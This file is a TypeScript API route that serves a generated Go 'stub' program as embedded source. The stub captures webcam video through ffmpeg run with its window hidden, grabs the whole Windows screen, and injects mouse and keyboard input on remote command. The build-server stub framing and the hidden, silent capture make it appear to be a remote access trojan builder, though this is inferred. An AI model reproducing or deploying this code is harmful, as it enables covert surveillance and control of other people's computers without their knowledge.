	common := []string{"-loglevel", "error", "-nostdin"}
	switch runtime.GOOS {
	case "windows":
		return append(common,
			"-f", "dshow", "-rtbufsize", "64M",
			"-framerate", fmt.Sprintf("%d", fps),
			"-video_size", fmt.Sprintf("%dx%d", w, (w*3)/4),
			"-i", dev,
			"-vf", fmt.Sprintf("scale=%d:-2", w),
			"-r", fmt.Sprintf("%d", fps),
			"-q:v", fmt.Sprintf("%d", q),
			"-f", "mjpeg", "pipe:1",
		)
	case "darwin":
		return append(common,
			"-f", "avfoundation",
			"-framerate", fmt.Sprintf("%d", fps),
			"-video_size", fmt.Sprintf("%dx%d", w, (w*3)/4),
			"-i", dev,
			"-vf", fmt.Sprintf("scale=%d:-2", w),
			"-r", fmt.Sprintf("%d", fps),
			"-q:v", fmt.Sprintf("%d", q),
			"-f", "mjpeg", "pipe:1",
		)
	default:
		return append(common,
			"-f", "v4l2",
			"-framerate", fmt.Sprintf("%d", fps),
			"-video_size", fmt.Sprintf("%dx%d", w, (w*3)/4),
			"-i", dev,
			"-vf", fmt.Sprintf("scale=%d:-2", w),
			"-r", fmt.Sprintf("%d", fps),
			"-q:v", fmt.Sprintf("%d", q),
			"-f", "mjpeg", "pipe:1",
		)
	}
}

func cameraLoop(send chan<- []byte, ctx context.Context) {
	defer cameraHardStop()
	bin, err := ensureFfmpeg()
	if err != nil {
		cameraPushError(send, "camera requires ffmpeg — auto-download failed: "+err.Error())
		return
	}
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		cmd := exec.CommandContext(ctx, bin, cameraFfmpegArgs()...)
		hideWindow(cmd)
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			cameraPushError(send, err.Error())
			return
		}
		var errBuf bytes.Buffer
		cmd.Stderr = &errBuf
		if err := cmd.Start(); err != nil {
			cameraPushError(send, err.Error())
			return
		}
		readMJPEG(ctx, send, bufio.NewReaderSize(stdout, 1<<20))
		_ = cmd.Wait()
		if ctx.Err() != nil {
			return
		}
		if errBuf.Len() > 0 {
			cameraPushError(send, strings.TrimSpace(errBuf.String()))
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}
}

func readMJPEG(ctx context.Context, send chan<- []byte, r *bufio.Reader) {
	var buf bytes.Buffer
	for {
		if ctx.Err() != nil {
			return
		}
		b, err := r.ReadByte()
		if err != nil {
			return
		}
		buf.WriteByte(b)
		if buf.Len() >= 2 {
			data := buf.Bytes()
			if data[len(data)-2] == 0xFF && data[len(data)-1] == 0xD9 {
				frame := make([]byte, len(data))
				copy(frame, data)
				buf.Reset()
				cameraSendFrame(send, frame)
			}
		}
	}
}

func cameraSendFrame(send chan<- []byte, frame []byte) {
	w, h := jpegDims(frame)
	b64 := base64.StdEncoding.EncodeToString(frame)
	msg, _ := json.Marshal(map[string]any{
		"type": "camera.frame",
		"payload": map[string]any{
			"w":     w,
			"h":     h,
			"jpeg":  b64,
			"ts":    time.Now().UnixMilli(),
			"bytes": len(frame),
		},
	})
	select {
	case send <- msg:
	default:
	}
}

func cameraPushError(send chan<- []byte, msg string) {
	m, _ := json.Marshal(map[string]any{
		"type": "camera.error",
		"payload": map[string]any{"error": msg, "ts": time.Now().UnixMilli()},
	})
	select {
	case send <- m:
	default:
	}
}

func jpegDims(b []byte) (int, int) {
	i := 0
	for i+9 < len(b) {
		if b[i] != 0xFF {
			i++
			continue
		}
		m := b[i+1]
		if (m >= 0xC0 && m <= 0xC3) || (m >= 0xC5 && m <= 0xC7) ||
			(m >= 0xC9 && m <= 0xCB) || (m >= 0xCD && m <= 0xCF) {
			h := int(b[i+5])<<8 | int(b[i+6])
			w := int(b[i+7])<<8 | int(b[i+8])
			return w, h
		}
		if m == 0xD8 || m == 0xD9 || m == 0x01 || (m >= 0xD0 && m <= 0xD7) {
			i += 2
			continue
		}
		if i+3 >= len(b) {
			return 0, 0
		}
		seg := int(b[i+2])<<8 | int(b[i+3])
		if seg < 2 {
			return 0, 0
		}
		i += 2 + seg
	}
	return 0, 0
}

func cameraList(send chan<- []byte, id string) {
	bin, err := ensureFfmpeg()
	if err != nil {
		sendResult(send, id, false, nil, "camera requires ffmpeg — auto-download failed: "+err.Error())
		return
	}
	var args []string
	switch runtime.GOOS {
	case "windows":
		args = []string{"-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"}
	case "darwin":
		args = []string{"-hide_banner", "-list_devices", "true", "-f", "avfoundation", "-i", ""}
	default:
		args = nil
	}
	devices := []string{}
	if args != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
		defer cancel()
		cmd := exec.CommandContext(ctx, bin, args...)
		hideWindow(cmd)
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out
		_ = cmd.Run()
		devices = parseFfmpegDevices(out.String())
	} else {
		matches, _ := exec.Command("sh", "-c", "ls /dev/video* 2>/dev/null").Output()
		for _, s := range strings.Fields(string(matches)) {
			devices = append(devices, s)
		}
	}
	if len(devices) == 0 {
		d, _, _, _ := cameraDefaults()
		devices = []string{d}
	}
	sendResult(send, id, true, map[string]any{"devices": devices}, "")
}

var reDshowName = regexp.MustCompile(` + "`" + `"([^"]+)"[^\\n]*\\(video\\)` + "`" + `)
var reAvfLine = regexp.MustCompile(` + "`" + `\\[(\\d+)\\]\\s+(.+)` + "`" + `)

func parseFfmpegDevices(s string) []string {
	out := []string{}
	switch runtime.GOOS {
	case "windows":
		for _, m := range reDshowName.FindAllStringSubmatch(s, -1) {
			out = append(out, "video="+m[1])
		}
	case "darwin":
		seenVideo := false
		for _, line := range strings.Split(s, "\\n") {
			if strings.Contains(line, "AVFoundation video devices") {
				seenVideo = true
				continue
			}
			if strings.Contains(line, "AVFoundation audio devices") {
				seenVideo = false
			}
			if !seenVideo {
				continue
			}
			if m := reAvfLine.FindStringSubmatch(line); m != nil {
				out = append(out, m[1])
			}
		}
	}
	return out
}
`

const cameraGo = `package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)
` + cameraGoBody + "`\n"






const screenWindowsGo = `//go:build windows
package main

import (
	"fmt"
	"image"
	"sync"
	"syscall"
	"unsafe"
)

var (
	scUser32  = syscall.NewLazyDLL("user32.dll")
	scGdi32   = syscall.NewLazyDLL("gdi32.dll")
	scShcore  = syscall.NewLazyDLL("shcore.dll")

	procGetDC2          = scUser32.NewProc("GetDC")
	procReleaseDC2      = scUser32.NewProc("ReleaseDC")
	procGetSysMetrics   = scUser32.NewProc("GetSystemMetrics")
	procSendInput2      = scUser32.NewProc("SendInput")
	procSetDpiCtx       = scUser32.NewProc("SetProcessDpiAwarenessContext")
	procSetDpiAware     = scUser32.NewProc("SetProcessDPIAware")
	procSetProcDpiAware = scShcore.NewProc("SetProcessDpiAwareness")

	procCreateCompatDC  = scGdi32.NewProc("CreateCompatibleDC")
	procCreateCompatBmp = scGdi32.NewProc("CreateCompatibleBitmap")
	procSelectObj       = scGdi32.NewProc("SelectObject")
	procBitBlt2         = scGdi32.NewProc("BitBlt")
	procDeleteObj       = scGdi32.NewProc("DeleteObject")
	procDeleteDC2       = scGdi32.NewProc("DeleteDC")
	procGetDIBits2      = scGdi32.NewProc("GetDIBits")
)

// SM_XVIRTUALSCREEN / SM_YVIRTUALSCREEN / SM_CXVIRTUALSCREEN / SM_CYVIRTUALSCREEN
const (
	smXVirtual  = 76
	smYVirtual  = 77
	smCxVirtual = 78
	smCyVirtual = 79
)

var dpiOnce sync.Once

// ensureDPIAware marks the process per-monitor DPI aware so BitBlt from the
// desktop DC returns the full-resolution image on scaled 4K/HiDPI displays
// instead of a blank/black frame. Falls back through older APIs on Win 7/8.
func ensureDPIAware() {
	dpiOnce.Do(func() {
		// Windows 10 1703+: DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = (HANDLE)-4
		// ^uintptr(3) is the two's-complement uintptr form of -4 (a constant
		// conversion like uintptr(int32(-4)) fails to compile).
		if procSetDpiCtx.Find() == nil {
			r, _, _ := procSetDpiCtx.Call(^uintptr(3))
			if r != 0 {
				return
			}
		}
		// Windows 8.1+: PROCESS_PER_MONITOR_DPI_AWARE = 2
		if procSetProcDpiAware.Find() == nil {
			procSetProcDpiAware.Call(2)
			return
		}
		// Windows Vista+
		procSetDpiAware.Call()
	})
}

type bitmapInfoHeader struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

type bitmapInfo struct {
	Header bitmapInfoHeader
	Colors [1]uint32
}

func captureFrame(maxW int) (*image.RGBA, int, int, error) {
	// Must run once before any GetSystemMetrics / GetDC call so Windows
	// reports real pixel dimensions and BitBlt returns real pixels instead
	// of a DPI-scaled blank frame on HiDPI / 4K displays.
	ensureDPIAware()

	// Use the full virtual screen (all monitors). On single-monitor setups
	// this is identical to SM_CXSCREEN/SM_CYSCREEN; on multi-monitor it
	// captures everything instead of returning a blank secondary.
	ox, _, _ := procGetSysMetrics.Call(smXVirtual)
	oy, _, _ := procGetSysMetrics.Call(smYVirtual)
	w, _, _ := procGetSysMetrics.Call(smCxVirtual)
	h, _, _ := procGetSysMetrics.Call(smCyVirtual)
	sw, sh := int(int32(w)), int(int32(h))
	sox, soy := int(int32(ox)), int(int32(oy))
	if sw <= 0 || sh <= 0 {
		// Fallback to the primary monitor.
		pw, _, _ := procGetSysMetrics.Call(0)
		ph, _, _ := procGetSysMetrics.Call(1)
		sw, sh = int(pw), int(ph)
		sox, soy = 0, 0
	}
	if sw <= 0 || sh <= 0 {
		return nil, 0, 0, fmt.Errorf("no screen")
	}
	screenDC, _, _ := procGetDC2.Call(0)
	if screenDC == 0 {
		return nil, 0, 0, fmt.Errorf("GetDC failed")
	}
	defer procReleaseDC2.Call(0, screenDC)
	memDC, _, _ := procCreateCompatDC.Call(screenDC)
	if memDC == 0 {
		return nil, 0, 0, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer procDeleteDC2.Call(memDC)
	bmp, _, _ := procCreateCompatBmp.Call(screenDC, uintptr(sw), uintptr(sh))
	if bmp == 0 {
		return nil, 0, 0, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer procDeleteObj.Call(bmp)
	old, _, _ := procSelectObj.Call(memDC, bmp)
	// SRCCOPY | CAPTUREBLT so layered / DWM-composited windows are included
	// instead of showing as a transparent / black rectangle.
	procBitBlt2.Call(memDC, 0, 0, uintptr(sw), uintptr(sh), screenDC,
		uintptr(sox), uintptr(soy), 0x00CC0020|0x40000000)
	if old != 0 {
		procSelectObj.Call(memDC, old)
	}
	var bi bitmapInfo
	bi.Header.Size = uint32(unsafe.Sizeof(bi.Header))
	bi.Header.Width = int32(sw)
	bi.Header.Height = -int32(sh)
	bi.Header.Planes = 1
	bi.Header.BitCount = 32
	bi.Header.Compression = 0
	buf := make([]byte, sw*sh*4)
	procGetDIBits2.Call(memDC, bmp, 0, uintptr(sh), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&bi)), 0)
	for i := 0; i < len(buf); i += 4 {
		buf[i], buf[i+2] = buf[i+2], buf[i]
		buf[i+3] = 255
	}
	img := &image.RGBA{Pix: buf, Stride: sw * 4, Rect: image.Rect(0, 0, sw, sh)}
	if maxW > 0 && maxW < sw {
		img = scaleRGBA(img, maxW)
	}
	return img, img.Rect.Dx(), img.Rect.Dy(), nil
}

func scaleRGBA(src *image.RGBA, newW int) *image.RGBA {
	oldW := src.Rect.Dx()
	oldH := src.Rect.Dy()
	if newW >= oldW {
		return src
	}
	newH := oldH * newW / oldW
	if newH < 1 {
		newH = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, newW, newH))
	for y := 0; y < newH; y++ {
		sy := y * oldH / newH
		for x := 0; x < newW; x++ {
			sx := x * oldW / newW
			si := sy*src.Stride + sx*4
			di := y*dst.Stride + x*4
			dst.Pix[di] = src.Pix[si]
			dst.Pix[di+1] = src.Pix[si+1]
			dst.Pix[di+2] = src.Pix[si+2]
			dst.Pix[di+3] = 255
		}
	}
	return dst
}

const (
	inpMouse    = 0
	inpKeyboard = 1

	mefMove       = 0x0001
	mefLeftDown   = 0x0002
	mefLeftUp     = 0x0004
	mefRightDown  = 0x0008
	mefRightUp    = 0x0010
	mefMiddleDown = 0x0020
	mefMiddleUp   = 0x0040
	mefWheel      = 0x0800
	mefAbsolute   = 0x8000

	kefKeyUp = 0x0002
)

type mouseInputS struct {
	Dx, Dy      int32
	MouseData   uint32
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type keybdInputS struct {
	WVk         uint16
	WScan       uint16
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type inputS struct {
	Type uint32
	Pad  uint32
	U    [32]byte
}

func doSendMouse(mi mouseInputS) {
	var inp inputS
	inp.Type = inpMouse
	*(*mouseInputS)(unsafe.Pointer(&inp.U[0])) = mi
	procSendInput2.Call(1, uintptr(unsafe.Pointer(&inp)), unsafe.Sizeof(inp))
}

func doSendKey(ki keybdInputS) {
	var inp inputS
	inp.Type = inpKeyboard
	*(*keybdInputS)(unsafe.Pointer(&inp.U[0])) = ki
	procSendInput2.Call(1, uintptr(unsafe.Pointer(&inp)), unsafe.Sizeof(inp))
}

func btnDown(b string) uint32 {
	switch b {
	case "right":
		return mefRightDown
	case "middle":
		return mefMiddleDown
	}
	return mefLeftDown
}

func btnUp(b string) uint32 {
	switch b {
	case "right":
		return mefRightUp
	case "middle":
		return mefMiddleUp
	}
	return mefLeftUp
}

func inputMouseCmd(send chan<- []byte, id string, p map[string]any) {
	op := getStr(p, "op", "move")
	xNorm := getFloat(p, "x", -1)
	yNorm := getFloat(p, "y", -1)
	button := getStr(p, "button", "left")
	delta := getNum(p, "delta", 0)
	var flags uint32
	var dx, dy int32
	if xNorm >= 0 && yNorm >= 0 {
		dx = int32(xNorm * 65535)
		dy = int32(yNorm * 65535)
		flags |= mefAbsolute | mefMove
	}
	switch op {
	case "move":
	case "down":
		flags |= btnDown(button)
	case "up":
		flags |= btnUp(button)
	case "click":
		doSendMouse(mouseInputS{Dx: dx, Dy: dy, DwFlags: flags | btnDown(button)})
		doSendMouse(mouseInputS{DwFlags: btnUp(button)})
		sendResult(send, id, true, nil, "")
		return
	case "scroll":
		doSendMouse(mouseInputS{MouseData: uint32(int32(delta * 120)), DwFlags: mefWheel})
		sendResult(send, id, true, nil, "")
		return
	}
	doSendMouse(mouseInputS{Dx: dx, Dy: dy, DwFlags: flags})
	sendResult(send, id, true, nil, "")
}

func inputKeyCmd(send chan<- []byte, id string, p map[string]any) {
	vk := uint16(getNum(p, "vk", 0))
	if vk == 0 {
		sendResult(send, id, false, nil, "missing vk")
		return
	}
	op := getStr(p, "op", "press")
	switch op {
	case "down":
		doSendKey(keybdInputS{WVk: vk})
	case "up":
		doSendKey(keybdInputS{WVk: vk, DwFlags: kefKeyUp})
	default:
		doSendKey(keybdInputS{WVk: vk})
		doSendKey(keybdInputS{WVk: vk, DwFlags: kefKeyUp})
	}
	sendResult(send, id, true, nil, "")
}
`

const screenOtherGo = `//go:build !windows
package main

import (
	"errors"
	"image"
)

func captureFrame(maxW int) (*image.RGBA, int, int, error) {
	return nil, 0, 0, errors.New("not_supported_on_this_os")
}

func inputMouseCmd(send chan<- []byte, id string, p map[string]any) {
	sendResult(send, id, false, nil, "not_supported")
}

func inputKeyCmd(send chan<- []byte, id string, p map[string]any) {
	sendResult(send, id, false, nil, "not_supported")
}
`

export const Route = createFileRoute('/api/public/buildserver/stub')({
  server: {
    handlers: {
      GET: async ({ request }) => {
        const key = (
          request.headers.get('x-buildserver-key') ??
          request.headers.get('authorization')?.replace(/^Bearer\s+/i, '') ??
          ''
        ).trim()
        const accepted = [
          process.env.BUILDSERVER_KEY?.trim(),
          process.env.BUILDSERVER_KEY_LEGACY?.trim(),
        ].filter((v): v is string => !!v && v.length > 0)
        if (accepted.length && !accepted.includes(key)) {
          return new Response('Unauthorized', { status: 401 })
        }
        return new Response(
          JSON.stringify({
            language: 'go',
            files: {
              'go.mod': goMod,
              'main.go': mainGo,
              'binding.go': bindingGo,
              'ws.go': wsGo,
              'metrics_windows.go': metricsWindowsGo,
              'metrics_other.go': metricsOtherGo,
              'screen.go': screenGo,
              'screen_windows.go': screenWindowsGo,
              'screen_other.go': screenOtherGo,
              'camera.go': cameraGo,
            },
          }),
          { headers: { 'Content-Type': 'application/json' } },
        )
      },
    },
  },
})
